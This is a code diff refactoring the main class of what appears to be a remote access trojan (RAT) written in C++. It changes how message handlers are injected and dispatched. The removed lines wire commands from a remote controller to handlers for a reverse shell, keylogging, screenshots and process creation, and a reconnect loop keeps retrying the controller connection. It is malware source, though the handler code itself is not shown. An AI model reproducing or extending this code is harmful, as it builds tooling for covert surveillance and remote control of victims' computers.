@@ -1,76 +1,45 @@
 ﻿#include "Rat.h"
 
-#include <utility>
-
 #include "ChatHandler.h"
 #include "CommunicationContainerBuilder.h"
-#include "CreateProcessHandler.h"
-#include "KeyLoggerHandler.h"
-#include "ReverseShellHandler.h"
-#include "TakeScreenshotHandler.h"
 #include "Trace.h"
 
 Rat::Rat(
-	ICommunicationFactory* factory,
-	const char* ip,
-	const int port
+	std::shared_ptr<IConnectionFactory> client,
+	std::shared_ptr<IConnection> connection,
+	std::shared_ptr<IMessageSender> sender,
+	std::shared_ptr<ICommunicationFactory> factory,
+	std::vector<std::shared_ptr<IMessageHandler>> handlers
 ) :
-	_container(CreateContainer(factory, ip, port)),
-	_client(_container->resolve<IConnectionFactory>()),
-	_connection(_container->resolve<IConnection>()),
-	_sender(_container->resolve<IMessageSender>()),
-	_listener(_container->resolve<IMessageListener>()),
-	_handlers(GetHandlers())
+	_client(std::move(client)),
+	_connection(std::move(connection)),
+	_sender(std::move(sender)),
+	_listener(factory->CreateMessageListener(
+		_connection.get(),
+		[this](const MessageType type, const SharedSpan& content) { OnMessage(type, content); },
+		[this] { OnDisconnection(); })),
+	_handlers(std::move(handlers))
 {
 }
 
-std::shared_ptr<Hypodermic::Container> Rat::CreateContainer(
-	ICommunicationFactory* factory,
-	const char* ip,
-	const int port)
-{
-	Hypodermic::ContainerBuilder builder;
-
-	const auto communicationsBuilder = CommunicationContainerBuilder(
-		factory,
-		ip,
-		port,
-		[this](const MessageType t, const SharedSpan c) { OnMessage(t, c); },
-		[this] { OnDisconnection(); });
-
-	builder.addRegistrations(communicationsBuilder);
-
-	builder.registerType<ReverseShellHandler>();
-	builder.registerType<KeyLoggerHandler>();
-	builder.registerType<ChatHandler>();
-	builder.registerType<CreateProcessHandler>();
-	builder.registerType<TakeScreenshotHandler>();
-
-	return builder.build();
-}
-
-std::map<MessageType, std::shared_ptr<IMessageHandler>> Rat::GetHandlers() const
-{
-	const auto reverseShellHandler = _container->resolve<ReverseShellHandler>();
-	const auto keyLoggerHandler = _container->resolve<KeyLoggerHandler>();
-
-	return {
-		{ MessageType::Chat, _container->resolve<ChatHandler>() },
-		{ MessageType::CreateProcessS, _container->resolve<CreateProcessHandler>() },
-		{ MessageType::StartReverseShell, reverseShellHandler },
-		{ MessageType::StopReverseShell, reverseShellHandler },
-		{ MessageType::ReverseShellMessage, reverseShellHandler },
-		{ MessageType::TakeScreenshot, _container->resolve<TakeScreenshotHandler>() },
-		{ MessageType::StartKeyLog, keyLoggerHandler },
-		{ MessageType::StopKeyLog, keyLoggerHandler }
-	};
-}
-
-void Rat::OnMessage(MessageType type, SharedSpan content)
+void Rat::OnMessage(const MessageType type, const SharedSpan content)
 {
 	try
 	{
-		_handlers[type]->Handle(type, std::move(content));
+		std::vector<std::shared_ptr<IMessageHandler>> canHandle;
+
+		std::ranges::copy_if(
+			_handlers,
+			std::back_inserter(canHandle), 
+			[type](const std::shared_ptr<IMessageHandler> handler)
+		    {
+			    return handler->CanHandle(type);
+		    });
+
+		for (const auto& handler : canHandle)
+		{
+			handler->Handle(type, content);
+		}
 	}
 	catch (std::exception& e)
 	{
@@ -91,9 +60,9 @@ void Rat::OnDisconnection()
 			*_connection = *_client->Connect();
 			connected = true;
 		}
-		catch (std::runtime_error&)
+		catch (std::runtime_error& e)
 		{
-			Trace("Failed to connect! Trying to reconnect\n");
+			Trace("Failed to connect! Trying to reconnect\n%s\n", e.what());
 		}
 	}
 }
